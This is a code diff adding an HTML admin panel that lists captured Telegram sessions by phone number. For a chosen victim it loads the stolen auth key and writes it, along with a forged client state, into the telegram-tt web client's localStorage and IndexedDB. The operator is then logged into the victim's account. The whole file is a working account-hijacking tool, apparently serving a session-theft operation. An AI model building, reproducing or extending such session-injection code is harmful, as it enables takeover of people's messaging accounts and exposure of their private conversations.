@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Session Manager</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #121212; color: #fff; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; background: #1e1e1e; padding: 20px; border-radius: 8px; }
+        input { width: calc(100% - 20px); padding: 10px; margin-bottom: 10px; background: #333; color: #fff; border: 1px solid #555; }
+        button { padding: 10px 15px; background: #007bff; color: white; border: none; cursor: pointer; border-radius: 5px; width: 100%; }
+        button:hover { background: #0056b3; }
+        .session-card { background: #2a2a2a; padding: 15px; margin-top: 15px; border-radius: 5px; border-left: 4px solid #00ffcc; }
+        .login-btn { background: #00ffcc; color: #000; font-weight: bold; margin-top: 10px; }
+        #dashboard { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="login-screen">
+    <h2>Admin Access</h2>
+    <input type="password" id="admin-pass" placeholder="Enter Admin Password">
+    <button onclick="loadSessions()">Enter Dashboard</button>
+</div>
+
+<div class="container" id="dashboard">
+    <h2>Secured Sessions</h2>
+    <button onclick="window.location.reload()" style="background: #dc3545; margin-bottom: 15px;">Logout</button>
+    <div id="sessions-list">Loading...</div>
+</div>
+
+<script>
+    let currentPassword = "";
+
+    async function loadSessions() {
+        const passInput = document.getElementById('admin-pass').value;
+        if (!passInput) return alert("Password required");
+
+        currentPassword = passInput;
+        document.getElementById('login-screen').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+
+        try {
+            const res = await fetch('/api/admin/sessions', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: currentPassword })
+            });
+            const data = await res.json();
+
+            if (data.success) {
+                let html = "";
+                data.sessions.forEach(s => {
+                    html += `
+                    <div class="session-card">
+                        <strong>Phone:</strong> ${s.phoneNumber}<br>
+                        <small>Date: ${new Date(s.dateAdded).toLocaleString()}</small><br>
+                        <button class="login-btn" onclick="loginToTT('${s.phoneNumber}')">🚀 Launch Telegram Web (telegram-tt)</button>
+                    </div>`;
+                });
+                document.getElementById('sessions-list').innerHTML = html || "No sessions found.";
+            } else {
+                alert("Error: " + data.error);
+                window.location.reload();
+            }
+        } catch (err) {
+            alert("Network Error");
+            window.location.reload();
+        }
+    }
+
+    async function loginToTT(phoneNumber) {
+        document.getElementById('sessions-list').innerHTML = "<h3 style='color:#00ffcc;'>Injecting Session... Please wait...</h3>";
+        
+        try {
+            const res = await fetch('/api/admin/get-tt-session', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: currentPassword, phoneNumber: phoneNumber })
+            });
+            const data = await res.json();
+
+            if (data.success) {
+                // Hex ကို Byte Array သို့ ပြောင်းခြင်း
+                const authKeyArray = new Uint8Array(data.authKeyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+                const userIdStr = String(data.userId);
+
+                // Storage အဟောင်းများ ရှင်းလင်းခြင်း
+                localStorage.clear();
+                sessionStorage.clear();
+
+                // telegram-tt အတွက် မရှိမဖြစ် Data များ localStorage ထဲ ထည့်သွင်းခြင်း
+                localStorage.setItem('dc', String(data.dcId));
+                
+                const globalState = {
+                    auth: { state: "authorizationStateReady", phoneNumber: phoneNumber },
+                    currentUserId: userIdStr,
+                    byTabId: {},
+                    messages: { byChatId: {} },
+                    chats: { byId: {}, listIds: { active: [] } },
+                    users: {
+                        byId: {
+                            [userIdStr]: { 
+                                id: userIdStr, 
+                                type: "userLocal", 
+                                phoneNumber: phoneNumber,
+                                firstName: "Target",
+                                lastName: "Agent"
+                            }
+                        }
+                    },
+                    recentEmojis: [],
+                    settings: { byKey: { theme: "dark", language: "en", messageTextSize: 16, animationLevel: 1, messageSendKeycombo: "enter" } }
+                };
+                localStorage.setItem('tt-global-state', JSON.stringify(globalState));
+
+                // IndexedDB သို့ AuthKey ထည့်သွင်းခြင်း (Web client မှ ဖတ်နိုင်ရန်)
+                const request = window.indexedDB.open('tt-data', 1); // Version 1
+                
+                // အကယ်၍ DB အသစ်ဖန်တီးရမည်ဆိုလျှင် ObjectStore ပါ တစ်ခါတည်းတည်ဆောက်ရန်
+                request.onupgradeneeded = function(event) {
+                    const db = event.target.result;
+                    if (!db.objectStoreNames.contains('keyval')) {
+                        db.createObjectStore('keyval');
+                    }
+                };
+
+                request.onsuccess = function(event) {
+                    const db = event.target.result;
+                    if (db.objectStoreNames.contains('keyval')) {
+                        const transaction = db.transaction(['keyval'], 'readwrite');
+                        const store = transaction.objectStore('keyval');
+                        
+                        store.put(authKeyArray, `dc${data.dcId}_auth_key`);
+                        store.put(String(data.dcId), 'dc');
+                        
+                        transaction.oncomplete = () => {
+                            // Inject လုပ်ပြီးပါက telegram-tt (/) သို့ တိုက်ရိုက်ခေါ်ဆောင်သွားပါမည်
+                            window.location.href = '/'; 
+                        };
+                    } else {
+                        alert("Storage init failed. Retrying...");
+                        window.location.href = '/';
+                    }
+                };
+
+                request.onerror = function() {
+                    alert("IndexedDB Error. Fallback redirection...");
+                    window.location.href = '/';
+                };
+
+            } else {
+                alert("Session Load Failed!");
+                window.location.reload();
+            }
+        } catch (err) {
+            alert("Error injecting session.");
+            window.location.reload();
+        }
+    }
+</script>
+</body>
+</html>
